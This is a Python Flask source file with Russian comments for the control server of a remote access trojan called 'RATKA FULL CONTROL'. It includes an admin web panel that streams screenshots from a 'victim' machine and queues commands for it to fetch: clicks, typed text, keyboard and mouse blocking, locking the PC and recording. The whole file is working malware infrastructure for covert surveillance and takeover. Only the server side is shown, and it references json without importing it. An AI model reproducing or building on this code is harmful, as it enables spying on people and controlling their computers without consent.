# app.py - ПОЛНОЕ УПРАВЛЕНИЕ ПК ЧЕРЕЗ БРАУЗЕР (ДЕМОНСТРАЦИЯ ЭКРАНА + МЫШЬ + КЛАВИАТУРА)
# Жертва: передаёт скриншот экрана + принимает команды мыши/клавиатуры
# Админ: видит экран жертвы в реальном времени, может кликать и печатать

from flask import Flask, request, jsonify, send_file, render_template_string
import base64
import io
import os
import time
import threading
import subprocess
import platform
from PIL import Image, ImageGrab
import numpy as np

app = Flask(__name__)

# ==================== ХРАНИЛИЩЕ ====================
current_screen = None
clients = 0
last_update = 0

# Команды для жертвы (очередь)
command_queue = []

# ==================== HTML СТРАНИЦА (АДМИНКА) ====================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RATKA FULL CONTROL</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a1a;
            font-family: 'Segoe UI', sans-serif;
            color: #00ff88;
            min-height: 100vh;
            padding: 15px;
            overflow: hidden;
        }
        .container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            max-width: 100%;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            border: 2px solid #00ff88;
            border-radius: 12px;
            margin-bottom: 10px;
            background: rgba(0,255,136,0.05);
            flex-shrink: 0;
        }
        .header h1 { font-size: 20px; }
        .header .status {
            display: flex;
            gap: 20px;
            font-size: 13px;
        }
        .header .status .online { color: #00ff88; }
        .header .status .offline { color: #ff4444; }
        .video-box {
            flex: 1;
            background: #000;
            border: 3px solid #00ff88;
            border-radius: 16px;
            overflow: hidden;
            position: relative;
            cursor: crosshair;
            min-height: 400px;
        }
        .video-box img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }
        .video-box .placeholder {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #00ff88;
            opacity: 0.5;
            text-align: center;
            pointer-events: none;
        }
        .video-box .placeholder .icon { font-size: 48px; display: block; }
        .controls {
            display: flex;
            gap: 10px;
            padding: 10px 0;
            flex-shrink: 0;
            flex-wrap: wrap;
        }
        .btn {
            background: #1a3a3a;
            color: #00ff88;
            border: 2px solid #00ff88;
            border-radius: 10px;
            padding: 10px 20px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.15s;
            user-select: none;
            touch-action: manipulation;
            font-size: 13px;
            white-space: nowrap;
        }
        .btn:active { transform: scale(0.95); }
        .btn.active { background: #00ff88; color: #0a0a1a; }
        .btn.danger { border-color: #ff0044; color: #ff0044; }
        .btn.danger:active { background: #ff0044; color: #0a0a1a; }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #1a3a3a;
            color: #00ff88;
            padding: 10px 24px;
            border-radius: 12px;
            border: 1px solid #00ff88;
            font-size: 13px;
            font-weight: 600;
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
            z-index: 999;
            white-space: nowrap;
        }
        .toast.show { opacity: 1; }
        .info-panel {
            display: flex;
            gap: 20px;
            font-size: 12px;
            opacity: 0.6;
            padding: 5px 10px;
            flex-shrink: 0;
        }
        .keyboard-input {
            display: none;
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: #1a1a2e;
            border: 2px solid #00ff88;
            border-radius: 12px;
            padding: 15px;
            z-index: 1000;
            min-width: 300px;
        }
        .keyboard-input input {
            background: #0a0a1a;
            color: #00ff88;
            border: 1px solid #00ff88;
            border-radius: 8px;
            padding: 10px;
            width: 100%;
            font-size: 16px;
            outline: none;
        }
        .keyboard-input .hint {
            font-size: 12px;
            opacity: 0.5;
            margin-top: 5px;
            text-align: center;
        }
        @media (max-width: 768px) {
            .header h1 { font-size: 16px; }
            .header .status { font-size: 11px; gap: 10px; }
            .btn { padding: 8px 14px; font-size: 12px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 RATKA FULL</h1>
            <div class="status">
                <span>Статус: <span id="status" class="offline">⏳ Ожидание</span></span>
                <span>Клиенты: <span id="clients">0</span></span>
                <span>FPS: <span id="fps">0</span></span>
                <span>Размер: <span id="resolution">-</span></span>
            </div>
        </div>
        
        <div class="video-box" id="videoBox">
            <img id="screen" src="/screen" alt="Экран жертвы">
            <div class="placeholder" id="placeholder">
                <span class="icon">🖥️</span>
                Ожидание подключения...
            </div>
        </div>
        
        <div class="controls">
            <button class="btn" id="kbBtn" onclick="toggleKb()">⌨️ Блок Клавы</button>
            <button class="btn" id="msBtn" onclick="toggleMs()">🖱️ Блок Мыши</button>
            <button class="btn" onclick="sendCommand('screenshot')">📸 Скрин</button>
            <button class="btn" id="recBtn" onclick="toggleRecord()">🎥 Запись</button>
            <button class="btn" onclick="sendCommand('lock')">🔒 Блок ПК</button>
            <button class="btn" onclick="showKeyboard()">⌨️ Печать</button>
            <button class="btn danger" onclick="sendCommand('disconnect')">🔌 Отключить</button>
        </div>
        
        <div class="info-panel">
            <span>🖱️ Клик по экрану → клик у жертвы</span>
            <span>📌 Скролл → работает</span>
            <span>⌨️ Печать → вводит текст</span>
        </div>
    </div>
    
    <div class="toast" id="toast"></div>
    
    <div class="keyboard-input" id="keyboardInput">
        <input type="text" id="textInput" placeholder="Введите текст и нажмите Enter...">
        <div class="hint">Enter → отправить текст жертве</div>
    </div>
    
    <script>
        // ====== DOM ======
        const screen = document.getElementById('screen');
        const placeholder = document.getElementById('placeholder');
        const statusEl = document.getElementById('status');
        const clientsEl = document.getElementById('clients');
        const fpsEl = document.getElementById('fps');
        const resolutionEl = document.getElementById('resolution');
        const videoBox = document.getElementById('videoBox');
        const toast = document.getElementById('toast');
        const keyboardInput = document.getElementById('keyboardInput');
        const textInput = document.getElementById('textInput');
        
        let connected = false;
        let frameCount = 0;
        let lastFpsUpdate = Date.now();
        let mouseBlocked = false;
        let kbBlocked = false;
        let recording = false;
        
        // ====== ВИДЕО ======
        function updateScreen() {
            screen.src = '/screen?_=' + Date.now();
            frameCount++;
            
            const now = Date.now();
            if (now - lastFpsUpdate > 1000) {
                fpsEl.textContent = frameCount;
                frameCount = 0;
                lastFpsUpdate = now;
            }
        }
        setInterval(updateScreen, 50); // 20 FPS
        
        screen.onload = function() {
            placeholder.style.display = 'none';
            if (!connected) {
                connected = true;
                statusEl.textContent = '🟢 Онлайн';
                statusEl.className = 'online';
                showToast('✅ Подключено!');
                
                // Получаем разрешение
                fetch('/status')
                    .then(r => r.json())
                    .then(data => {
                        if (data.resolution) {
                            resolutionEl.textContent = data.resolution;
                        }
                    });
            }
        };
        
        screen.onerror = function() {
            if (connected) {
                connected = false;
                statusEl.textContent = '⏳ Ожидание';
                statusEl.className = 'offline';
                placeholder.style.display = 'block';
            }
        };
        
        // ====== КЛИКИ ПО ЭКРАНУ ======
        videoBox.addEventListener('click', function(e) {
            const rect = this.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            sendCommand('click', {x: x, y: y, button: 'left'});
            showToast('🖱️ Клик');
        });
        
        videoBox.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            const rect = this.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            sendCommand('click', {x: x, y: y, button: 'right'});
            showToast('🖱️ ПКМ');
        });
        
        videoBox.addEventListener('wheel', function(e) {
            e.preventDefault();
            const delta = e.deltaY > 0 ? 'down' : 'up';
            sendCommand('scroll', {delta: delta});
        });
        
        // ====== КОМАНДЫ ======
        async function sendCommand(cmd, val) {
            try {
                let url = '/command?cmd=' + encodeURIComponent(cmd);
                if (val !== undefined) {
                    url += '&val=' + encodeURIComponent(JSON.stringify(val));
                }
                await fetch(url);
            } catch(e) {}
        }
        
        function showToast(text) {
            toast.textContent = text;
            toast.classList.add('show');
            clearTimeout(toast._timer);
            toast._timer = setTimeout(() => toast.classList.remove('show'), 1500);
        }
        
        function toggleKb() {
            kbBlocked = !kbBlocked;
            const btn = document.getElementById('kbBtn');
            btn.classList.toggle('active', kbBlocked);
            btn.innerHTML = kbBlocked ? '⌨️ Блок!' : '⌨️ Блок Клавы';
            sendCommand('block_kb', kbBlocked);
            showToast(kbBlocked ? '⌨️ Клавиатура ЗАБЛОКИРОВАНА' : '⌨️ Клавиатура разблокирована');
        }
        
        function toggleMs() {
            mouseBlocked = !mouseBlocked;
            const btn = document.getElementById('msBtn');
            btn.classList.toggle('active', mouseBlocked);
            btn.innerHTML = mouseBlocked ? '🖱️ Блок!' : '🖱️ Блок Мыши';
            sendCommand('block_mouse', mouseBlocked);
            showToast(mouseBlocked ? '🖱️ Мышь ЗАБЛОКИРОВАНА' : '🖱️ Мышь разблокирована');
        }
        
        function toggleRecord() {
            recording = !recording;
            const btn = document.getElementById('recBtn');
            btn.classList.toggle('active', recording);
            btn.innerHTML = recording ? '⏹️ Стоп' : '🎥 Запись';
            sendCommand('record', recording);
            showToast(recording ? '🎥 Запись начата' : '⏹️ Запись остановлена');
        }
        
        function showKeyboard() {
            keyboardInput.style.display = 'block';
            textInput.focus();
        }
        
        textInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const text = this.value;
                if (text) {
                    sendCommand('type', {text: text});
                    showToast('⌨️ Отправлено: ' + text);
                    this.value = '';
                    keyboardInput.style.display = 'none';
                }
            }
            if (e.key === 'Escape') {
                keyboardInput.style.display = 'none';
            }
        });
        
        // ====== СТАТУС ======
        async function updateStatus() {
            try {
                const resp = await fetch('/status');
                const data = await resp.json();
                clientsEl.textContent = data.clients || 0;
                if (data.resolution) {
                    resolutionEl.textContent = data.resolution;
                }
            } catch(e) {}
        }
        setInterval(updateStatus, 2000);
        updateStatus();
        
        console.log('🎯 RATKA FULL CONTROL');
        console.log('🖱️ Кликайте по экрану для управления');
        console.log('⌨️ Используйте кнопку "Печать" для ввода текста');
    </script>
</body>
</html>
"""

# ==================== ЭНДПОИНТЫ ====================

@app.route('/')
def index():
    """Главная страница"""
    return render_template_string(HTML)

@app.route('/upload', methods=['POST'])
def upload():
    """Принимает скриншот от жертвы"""
    global current_screen, clients, last_update
    
    try:
        data = request.get_json()
        if 'frame' in data:
            frame_data = base64.b64decode(data['frame'])
            img = Image.open(io.BytesIO(frame_data))
            current_screen = img
            clients = 1
            last_update = time.time()
            return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
    return jsonify({'status': 'error'}), 400

@app.route('/screen')
def screen():
    """Отдаёт скриншот админу"""
    global current_screen
    
    if current_screen is not None:
        buf = io.BytesIO()
        current_screen.save(buf, format='JPEG', quality=50)
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')
    else:
        # Чёрный экран
        img = Image.new('RGB', (800, 600), color='black')
        buf = io.BytesIO()
        img.save(buf, format='JPEG')
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')

@app.route('/command')
def command():
    """Принимает команды от админа и добавляет в очередь для жертвы"""
    global command_queue
    
    cmd = request.args.get('cmd', '')
    val = request.args.get('val', '')
    
    # Парсим значение если это JSON
    try:
        if val:
            val = json.loads(val)
    except:
        pass
    
    print(f"[CMD] {cmd} = {val}")
    
    # Добавляем в очередь
    command_queue.append({'cmd': cmd, 'val': val})
    
    return jsonify({'status': 'ok'})

@app.route('/status')
def status():
    """Статус"""
    global current_screen, clients
    
    resolution = "Нет данных"
    if current_screen is not None:
        resolution = f"{current_screen.width}x{current_screen.height}"
    
    return jsonify({
        'clients': clients,
        'status': 'online' if current_screen is not None else 'waiting',
        'resolution': resolution,
        'commands_in_queue': len(command_queue)
    })

@app.route('/pop_command')
def pop_command():
    """Жертва забирает команды из очереди"""
    global command_queue
    
    if command_queue:
        cmd = command_queue.pop(0)
        return jsonify(cmd)
    else:
        return jsonify({'cmd': 'none'})

# ==================== ЗАПУСК ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
